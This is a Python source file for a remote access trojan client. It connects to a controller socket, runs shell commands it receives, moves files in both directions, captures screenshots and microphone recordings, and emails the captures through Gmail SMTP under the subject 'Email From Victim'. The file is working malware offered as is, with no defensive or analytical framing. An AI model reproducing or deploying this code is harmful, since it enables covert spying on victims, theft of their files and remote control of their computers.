import os
import socket
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pyaudio
import wave
from PIL import ImageGrab
import time

# socket variables
s = socket.socket()
s.connect(('127.0.0.1', 9984))


def file_size(path):
    return os.path.getsize(path)


def get_file(data):
    # data = data[9: -1] + data[-1]
    f = open(data, 'rb')
    while True:
        content = f.read(1024)
        if content:
            s.sendall(content)
        else:
            f.close()
            break


def take_screenshot(data):
    snapshot = ImageGrab.grab()
    save_path = data
    snapshot.save(save_path)


def download_file(data):
    with open(data, 'wb')as f:
        while True:
            data = s.recv(1024)
            if not data or len(data) < 1024:
                f.write(data)
                f.flush()
                f.close()
                break
            f.write(data)


def take_record(record_time, file_to_save):
    p = pyaudio.PyAudio()

    stream = p.open(format=pyaudio.paInt16,
                    channels=2,
                    rate=44100,
                    input=True,
                    frames_per_buffer=1024)

    frames = []

    for i in range(0, int(44100 / 1024 * record_time)):
        data = stream.read(1024)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(file_to_save, 'wb')
    wf.setnchannels(2)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(44100)
    wf.writeframes(b''.join(frames))
    wf.close()


def send_email(file_name):
    fromaddr = ""
    toaddr = ""

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Email From Victim"

    # string to store the body of the mail
    body = "Body_of_the_mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = file_name
    attachment = open(filename, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(fromaddr, )

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    s.quit()


def client():
    while True:
        data = s.recv(1024).decode('utf-8')
        if data.startswith('cmd '):
            try:
                data = data[4:-1] + data[-1]
                s.send(subprocess.check_output(data, shell=True))
            except Exception:
                s.send(f"Error with {data} command".encode('utf-8'))

        elif data.startswith('get file '):
            data = data[9: -1] + data[-1]
            get_file(data)


        elif data.startswith('send email '):
            data = data[11:-1] + data[-1]
            send_email(data)
            s.sendall('The Email Was Sent'.encode('utf-8'))

        elif data.startswith('download file '):
            data = s.recv(1024).decode('utf-8')
            download_file(data)

        elif data.startswith('take record '):
            data = s.recv(1024).decode('utf-8')
            location_of_file = s.recv(1024).decode('utf-8')
            take_record(int(data), location_of_file)
            send_email(location_of_file)
            get_file(location_of_file)

        elif data.startswith('take screenshot '):
            data = data[16:-1] + data[-1]
            take_screenshot(data)
            send_email(data)
            s.sendall('You got the screenshot in the mail'.encode('utf-8'))
            get_file(data)



        else:
            s.send('The command was not found'.encode('utf-8'))

    s.close()


if __name__ == '__main__':
    client()
